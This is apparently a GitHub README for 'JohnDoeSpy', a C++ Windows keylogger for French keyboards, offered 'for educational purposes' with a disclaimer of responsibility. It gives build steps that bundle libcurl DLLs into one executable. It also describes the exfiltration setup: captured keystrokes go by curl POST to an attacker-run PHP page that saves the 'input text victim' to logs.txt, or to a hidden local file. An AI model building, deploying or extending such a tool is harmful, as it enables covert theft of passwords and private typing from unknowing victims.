# JohnDoeSpy

# Introduction
<p> This is a simple keylogger for educational purposes. I'm not responsible of your usage. </p>
<p> Keylogger build in C++ for detect keys from keyboards (specific keys only available for french keyboard). You can receive data from url intermediate hosting or by simple text file hidden in your directory. </p>


# HAVE TO KNOW 

<p> This keylogger is build for french keyboard, by the way specific characters will appear with bad matching if you use an other country's keyboard. But any others characters show on <p/>

### WORK ONLY FOR WINDOWS ###


## How to start

* Open terminal from root path project 
* <code> cd build\dllToExe </code>
* <code> pefrmdllembed.exe -impinj KeyloggerV1.exe libcurl-d.dll zlibd1.dll <NameKeylogger.exe> </code>
* Launch <NameKeylogger.exe>

## Configuration for hosting


<p> Intermediate hosting works with curl request and POST parameters. So your post parameters name have to match with the post parameter from curl request. 
 
### "text" is by default the name of parameter. You can modify it into Request.cpp source file.
<p>You have an example in web folder with index.php file. Copy paste or write a script like this on your page.
  <logs.txt> is the file by default where input text victim will be saved into your folder. </p>



### UPDATE COMMING SOON


